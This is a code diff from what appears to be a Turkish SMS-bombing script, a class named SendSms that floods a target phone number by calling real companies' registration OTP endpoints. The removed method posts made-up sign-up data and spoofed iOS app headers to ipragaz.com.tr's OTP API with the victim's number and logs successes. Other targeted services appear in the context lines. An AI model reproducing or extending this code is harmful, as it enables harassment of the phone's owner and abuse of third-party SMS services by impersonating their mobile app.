@@ -408,20 +408,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")
 
 
-    #ipragaz.com.tr
-    def Ipragaz(self):
-        try:
-            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
-            headers = {"Content-Type": "application/json", "X-Api-Token": "", "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", "Accept": "*/*", "App-Name": "ipragaz-mobile", "Os": "ios", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", "App-Build": "41", "Os-Version": "15.7.7", "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", "Connection": "close"}
-            json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
-            r = requests.post(url, headers=headers, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+
 
 
     #metro-tr.com
